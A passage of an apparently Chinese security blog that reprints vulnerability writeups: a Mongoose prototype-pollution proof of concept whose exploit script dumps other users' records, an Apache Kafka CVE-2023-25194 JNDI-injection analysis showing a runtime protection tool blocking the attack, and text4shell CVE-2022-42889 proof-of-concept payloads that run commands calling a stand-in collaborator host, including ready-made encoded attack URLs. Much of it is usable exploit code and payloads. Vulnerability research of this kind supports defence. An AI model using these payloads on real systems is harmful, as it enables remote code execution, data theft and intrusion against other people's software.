class="string">&#x27;world!&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">process.exit();</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2><span id="resulting-database-entry">Resulting Database Entry</span></h2><blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exploit&gt; db.examples.find(&#123;&#125;)</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&quot;64a757117e3dbf11b14e0fd4&quot;</span>),</span><br><span class="line">    __v: 0,</span><br><span class="line">    [<span class="string">&#x27;__proto__&#x27;</span>]: &#123; polluted: <span class="string">&#x27;world!&#x27;</span> &#125;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2><span id="explanation">Explanation</span></h2><blockquote>
-<p>When Mongoose finds documents and reads the malicious document into an object, it uses an object with a prototype. If the top level object contains a <code>__proto__</code> field, it leads to overwrites of the object prototype.</p>
-</blockquote>
-<h3><span id="affected-code">Affected Code:</span></h3><blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// document.js</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Init helper.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Object</span>&#125; self document instance</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Object</span>&#125; obj raw mongodb doc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Object</span>&#125; doc object we are initializing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Object</span>&#125; [opts] Optional Options</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Boolean</span>&#125; [opts.setters] Call `applySetters` instead of `cast`</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">String</span>&#125; [prefix] Prefix to add to each path</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@api</span> <span class="variable">private</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">init</span>(<span class="params">self, obj, doc, opts, prefix</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">_init</span>(<span class="params">index</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!schemaType &amp;&amp; utils.<span class="title function_">isPOJO</span>(obj[i])) &#123;</span><br><span class="line">      <span class="comment">//  ...</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// (1)</span></span><br><span class="line">      <span class="comment">// our malicious payload first reaches here, where:</span></span><br><span class="line">      <span class="comment">// obj is some document</span></span><br><span class="line">      <span class="comment">// i = &#x27;__proto__&#x27;</span></span><br><span class="line">      <span class="comment">// so, obj[i] gives Object.prototype, which gets used in (2)</span></span><br><span class="line">      <span class="title function_">init</span>(self, obj[i], doc[i], opts, path + <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!schemaType) &#123;</span><br><span class="line">      <span class="comment">// (2)</span></span><br><span class="line">      <span class="comment">// after the recursive call on (1), we reach here</span></span><br><span class="line">      <span class="comment">// pollution happens on the next line, where:</span></span><br><span class="line">      <span class="comment">// doc: Object.prototype,</span></span><br><span class="line">      <span class="comment">// obj = &#123; polluted: &#x27;world!&#x27; &#125;,</span></span><br><span class="line">      <span class="comment">// i = &#x27;polluted&#x27;</span></span><br><span class="line">      doc[i] = obj[i];</span><br><span class="line">      <span class="keyword">if</span> (!strict &amp;&amp; !prefix) &#123;</span><br><span class="line">        self[i] = obj[i];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2><span id="credits">Credits</span></h2><blockquote>
-<p>This bug was found by myself (<a target="_blank" rel="noopener" href="https://twitter.com/ehhthing">@ehhthing</a>) and <a target="_blank" rel="noopener" href="https://twitter.com/strellic_">@strellic_</a></p>
-</blockquote>
-<h2><span id="impact">Impact</span></h2><blockquote>
-<p>If used with Express and EJS, this bug can <a target="_blank" rel="noopener" href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce">easily lead to RCE</a>. Many other libraries have known prototype pollution exploits as well, which may cause significant impact.</p>
-<p>We also found that we can actually exploit Mongoose itself with the prototype pollution, to cause it to bypass all query parameters when using <code>.find()</code>, which allows an attacker to potentially dump entire collections:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; connect, model, Schema &#125; <span class="keyword">from</span> <span class="string">&#x27;mongoose&#x27;</span>;</span><br><span class="line"></span><br><span class="line">const mongoose = <span class="keyword">await</span> connect(<span class="string">&#x27;mongodb://127.0.0.1:27017/exploit&#x27;</span>);</span><br><span class="line"></span><br><span class="line">const Post = model(<span class="string">&#x27;Post&#x27;</span>, new Schema(&#123;</span><br><span class="line">    owner: String,</span><br><span class="line">    message: String</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> Post.create(&#123;</span><br><span class="line">    owner: <span class="string">&quot;SECRET_USER&quot;</span>,</span><br><span class="line">    message: <span class="string">&quot;SECRET_MESSAGE&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">const post = <span class="keyword">await</span> Post.create(&#123;</span><br><span class="line">    owner: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">    message: <span class="string">&quot;test message&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">await</span> Post.findByIdAndUpdate(post._<span class="built_in">id</span>, &#123;</span><br><span class="line">    $rename: &#123;</span><br><span class="line">        message: <span class="string">&#x27;__proto__.owner&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// this pollutes Object.prototype.owner = <span class="string">&quot;test message&quot;</span></span><br><span class="line"><span class="keyword">await</span> Post.find(&#123; owner: <span class="string">&quot;user&quot;</span> &#125;);</span><br><span class="line"></span><br><span class="line">// now, when querying posts, even when an owner <span class="keyword">is</span> specified, <span class="built_in">all</span> posts are returned</span><br><span class="line">const posts = <span class="keyword">await</span> Post.find(&#123;</span><br><span class="line">    owner: <span class="string">&quot;user2&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(posts); // both posts created are found</span><br><span class="line">/*</span><br><span class="line">output:</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _<span class="built_in">id</span>: new ObjectId(<span class="string">&quot;64a7610756da3c04f900bf49&quot;</span>),</span><br><span class="line">    owner: <span class="string">&#x27;SECRET_USER&#x27;</span>,</span><br><span class="line">    message: <span class="string">&#x27;SECRET_MESSAGE&#x27;</span>,</span><br><span class="line">    __v: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    _<span class="built_in">id</span>: new ObjectId(<span class="string">&quot;64a7610756da3c04f900bf4b&quot;</span>),</span><br><span class="line">    owner: <span class="string">&#x27;user&#x27;</span>,</span><br><span class="line">    __v: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line">*/</span><br><span class="line">process.exit();</span><br></pre></td></tr></table></figure>
-
-<p>This could also easily lead to denial of service depending on how large a Mongo collection is, and which other libraries are being used in the application.</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Mongoose/" rel="tag">Mongoose</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/23/CVE-2023-25194-Apache-Kafka/">
-                Apache Kafka 远程代码执行漏洞复现及攻击拦截 (CVE-2023-25194)
-            </a>
-        </h2>
-    
-    <time>
-        Jan 23, 2024
-    </time>
-    <section class="content">
-        <h1><span id="apache-kafka-远程代码执行漏洞复现及攻击拦截-cve-2023-25194">Apache Kafka 远程代码执行漏洞复现及攻击拦截 (CVE-2023-25194)</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2295788">云鲨RASP</a> 并作补充</p>
-</blockquote>
-<h2><span id="漏洞简介">漏洞简介</span></h2><blockquote>
-<p>Apache Kafka是一个分布式数据流处理平台，可以实时发布、订阅、存储和处理数据流。Kafka Connect是一种用于在kafka和其他系统之间可扩展、可靠的流式传输数据的工具。攻击者可以利用基于SASLJAAS 配置和SASL 协议的任意Kafka客户端，对Kafka Connect worker 创建或修改连接器时，通过构造特殊的配置，进行JNDI 注入来实现远程代码执行。</p>
-</blockquote>
-<h2><span id="影响版本">影响版本</span></h2><blockquote>
-<p>2.4.0&lt;&#x3D;Apache kafka&lt;&#x3D;3.3.2</p>
-</blockquote>
-<h2><span id="修复方案">修复方案</span></h2><blockquote>
-<p>更新Apache Kafka至官方最新版本</p>
-</blockquote>
-<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
-<p>通过<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub%E6%90%AD%E5%BB%BA">https://github.com/vulhub/vulhub搭建</a></p>
-</blockquote>
-<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
-<p>exp可参考：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/5d90e8275084b0ae9166ec38cacd22e5a5a94fb8/http/vulnerabilities/apache/apache-druid-kafka-connect-rce.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/5d90e8275084b0ae9166ec38cacd22e5a5a94fb8/http/vulnerabilities/apache/apache-druid-kafka-connect-rce.yaml</a></p>
-<p>发起攻击请求：</p>
-<p>构造payload ,执行新建&#x2F;tmp&#x2F;test.txt文件</p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/1.png" alt="image"></p>
-<p>验证漏洞存在，文件新建成功</p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/2.png" alt="image"></p>
-<p>开启RASP后发起攻击：</p>
-<p>在业务优先模式下，RASP会出现JNDI注入的告警，拦截最终的命令执行</p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/3.png" alt="image"></p>
-<p>堆栈信息为</p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/4.png" alt="image"></p>
-<p>在防护模式下将直接在JNDI注入处被拦截</p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/5.png" alt="image"></p>
-<p>堆栈信息为</p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/6.png" alt="image"></p>
-</blockquote>
-<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
-<p>开始</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Properties)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/7.png" alt="image"></p>
-<p>跟进到</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Propertiesorg.apache.kafka.common.serialization.Serializer&lt;K&gt;,org.apache.kafka.common.serialization.Serializer&lt;V&gt;)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/8.png" alt="image"></p>
-<p>调用</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.utils.Utils#propsToMap</span><br></pre></td></tr></table></figure>
-
-<p>对传入对象进行处理</p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/9.png" alt="image"></p>
-<p>将map型的对象传入</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Map&lt;java.lang.String,java.lang.Object&gt;org.apache.kafka.common.serialization.Serializer&lt;K&gt;org.apache.kafka.common.serialization.Serializer&lt;V&gt;)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/10.png" alt="image"></p>
-<p>之后调用</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.ProducerConfig#appendSerializerToConfig</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/11.png" alt="image"></p>
-<p>将返回的newConfigs传入</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.ProducerConfig#ProducerConfig(java.util.Map&lt;java.lang.String,java.lang.Object&gt;)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/12.png" alt="image"></p>
-<p>将配置参数传入</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(org.apache.kafka.clients.producer.ProducerConfig,org.apache.kafka.common.serialization.Serializer&lt;K&gt;org.apache.kafka.common.serialization.Serializer&lt;V&gt;org.apache.kafka.clients.producer.internals.ProducerMetadata,org.apache.kafka.clients.KafkaClientorg.apache.kafka.clients.producer.internals.ProducerInterceptors&lt;K,V&gt;org.apache.kafka.common.utils.Time)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/13.png" alt="image"></p>
-<p>赋值后调用</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.KafkaProducer#newSender</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/14.png" alt="image"></p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/15.png" alt="image"></p>
-<p>调用到</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.ClientUtils#createChannelBuilder</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/16.png" alt="image"></p>
-<p>赋值后调用</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.network.ChannelBuilders#clientChannelBuilder</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/17.png" alt="image"></p>
-<p>这里对值做了一个判断后调用</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.network.ChannelBuilders#create</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/18.png" alt="image"></p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/19.png" alt="image"></p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/20.png" alt="image"></p>
-<p>Create方法中得到map型的configs后进行switch，得到SaslChannelBuilder类型channelBuilder的对象，switch结束后调用了</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.network.SaslChannelBuilder#configure</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/21.png" alt="image"></p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/22.png" alt="image"></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.network.SaslChannelBuilder#configure</span><br></pre></td></tr></table></figure>
-
-<p>进入循环后到</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.security.authenticator.LoginManager#acquireLoginManager</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/23.png" alt="image"></p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/24.png" alt="image"></p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/25.png" alt="image"></p>
-<p>判断值后到</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.security.authenticator.LoginManager#LoginManager</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/26.png" alt="image"></p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/27.png" alt="image"></p>
-<p>跟进到</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.security.authenticator.AbstractLogin#login</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/28.png" alt="image"></p>
-<p>调用</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.security.auth.login.LoginContext#login</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/29.png" alt="image"></p>
-<p>调用</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.security.auth.login.LoginContext#invokePriv</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/30.png" alt="image"></p>
-<p>调用</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.security.auth.login.LoginContext#invoke</span><br></pre></td></tr></table></figure>
-
-<p>进行逻辑判断后调用initialize方法</p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/31.png" alt="image"></p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/32.png" alt="image"></p>
-<p>Initialize中得到userProvider</p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/33.png" alt="image"></p>
-<p>user.provider.url通过jndi提供</p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/34.png" alt="image"></p>
-<p>调用</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.sun.security.auth.<span class="keyword">module</span>.JndiLoginModule#login</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/35.png" alt="image"></p>
-<p>调用</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.sun.security.auth.<span class="keyword">module</span>.JndiLoginModule#attemptAuthentication</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/36.png" alt="image"></p>
-<p>通过</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.InitialContext#lookup(java.lang.String)</span><br></pre></td></tr></table></figure>
-
-<p>执行userProvider的值</p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/37.png" alt="image"></p>
-<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/38.png" alt="image"></p>
-<p>由于RASP对javax.naming.InitialContext.lookup调用做了防护策略检测，所以会在此处拦截。</p>
-</blockquote>
-<h2><span id="reference">Reference</span></h2><blockquote>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/luelueking/Java-CVE-Lists#cve-2023-25194">https://github.com/luelueking/Java-CVE-Lists#cve-2023-25194</a></li>
-<li><a target="_blank" rel="noopener" href="https://blog.snert.cn/index.php/2023/04/04/cve-2023-25194-kafka-jndi-injection-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://blog.snert.cn/index.php/2023/04/04/cve-2023-25194-kafka-jndi-injection-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></li>
-</ul>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/23/CVE-2022-42889-Apache-Commons/">
-                text4shell CVE-2022-42889 poc
-            </a>
-        </h2>
-    
-    <time>
-        Jan 23, 2024
-    </time>
-    <section class="content">
-        <h1><span id="text4shell-cve-2022-42889-poc">text4shell CVE-2022-42889 poc</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.ddosi.org/cve-2022-42889/">雨苁</a> 并作补充</p>
-</blockquote>
-<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
-<p>在 Apache Common Text 包 1.5 到 1.9 中发现了一个存在缺陷的代码执行版本。攻击者从 Apache Commons Text 中包含的过程中成功完成，插值可能被动态定义。服务器应用程序会受到影响(RCE) 和不受远程服务器的隐私接触的影响。</p>
-<p>Apache Commons Text 执行变量插值，允许动态评估和扩展属性。插值的标准格式是“${prefix:name}”，其中“prefix”用于定位执行插值的 org.apache.commons.text.lookup.StringLookup 的实例。从 1.5 版到 1.9 版，默认 Lookup 实例集包括可能导致任意代码执行或与远程服务器联系的插值器。这些查找是： – “script” – 使用 JVM 脚本执行引擎 (javax.script) 执行表达式 – “dns” – 解析 dns 记录 – “url” – 从 url 加载值，包括来自远程服务器 如果使用了不受信任的配置值，则在受影响的版本中使用插值默认值的应用程序可能容易受到远程代码执行或与远程服务器的无意接触的影响。</p>
-<p>建议用户升级到 Apache Commons Text 1.10.0，默认情况下禁用有问题的插值器。</p>
-</blockquote>
-<h2><span id="影响范围">影响范围</span></h2><blockquote>
-<ul>
-<li>如果您依赖于使用 1.10.0 之前的 commons-text 版本的软件，您可能仍然不会受到攻击：只有当该软件使用<code>StringSubstitutor</code>API 而没有正确清理任何不受信任的输入时，您才会受到影响。</li>
-<li>如果您自己的软件使用 commons-text，请仔细检查它是否使用<code>StringSubstitutor</code>API，而没有正确清理任何不受信任的输入。如果是这样，更新到 1.10.0 可能是一个快速的解决方法，但推荐的解决方案是同时正确验证和清理任何不受信任的输入。</li>
-</ul>
-<p>Apache Commons Text 是一个低级库，用于执行各种文本操作，例如转义、计算字符串差异以及用通过插值器查找的值替换文本中的占位符。使用字符串替换功能时，一些可用的插值器可以触发网络访问或代码执行。这是有意的，但这也意味着如果应用程序在传递给替换的字符串中包含用户输入而未对其进行适当清理，则攻击者将允许攻击者触发这些插值器。</p>
-<p>出于这个原因，Apache Commons Text 团队决定将配置更新为“默认情况下更安全”，从而减轻无法验证输入的影响，并且不会让攻击者访问这些插值器。但是，仍然建议用户谨慎对待不受信任的输入。</p>
-<p>我们目前不知道有任何应用程序将不受信任的输入传递给替代者，因此在 Apache Commons Text 1.10.0 之前可能会受到此问题的影响。</p>
-<p>此问题与<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/security.html">Log4Shell (CVE-2021-44228)</a>不同，因为在 Log4Shell 中，可以从日志消息正文中进行字符串插值，该正文通常包含不受信任的输入。在 Apache Common Text issue 中，相关方法明确用于执行字符串插值并明确记录在案，因此应用程序不太可能在没有适当验证的情况下无意中传递不受信任的输入。</p>
-</blockquote>
-<h2><span id="漏洞利用条件">漏洞利用条件</span></h2><blockquote>
-<p>为了利用这些漏洞，<strong>必须满足以下要求</strong>：</p>
-<ul>
-<li>运行 1.5 到 1.9 版本的 Apache Commons Text</li>
-<li>使用<a target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/StringSubstitutor.html">StringSubstitutor</a>插值器</li>
-</ul>
-</blockquote>
-<h2><span id="cve-2022-42889-poc">CVE-2022-42889 poc</span></h2><blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.get.Runtime().exec(\<span class="string">&#x27;&#x27;</span>.trim($cmd).<span class="string">&#x27;\&#x27;)&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>用有效负载替换参数值：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//your-target.com/exploit?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20COLLABORATOR-HERE%27%29%7</span></span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3><span id="网址">网址</span></h3><blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;url:UTF-<span class="number">8</span>:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//your-target.com/exploit?search=%24%7Burl%3AUTF-8%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20COLLABORATOR-HERE%27%29%7</span></span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3><span id="dns">Dns</span></h3><blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;dns:address:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//your-target.com/exploit?search=%24%7Bdns%3Aaddress%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20COLLABORATOR-HERE%27%29%7</span></span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3><span id="批量">批量</span></h3><blockquote>
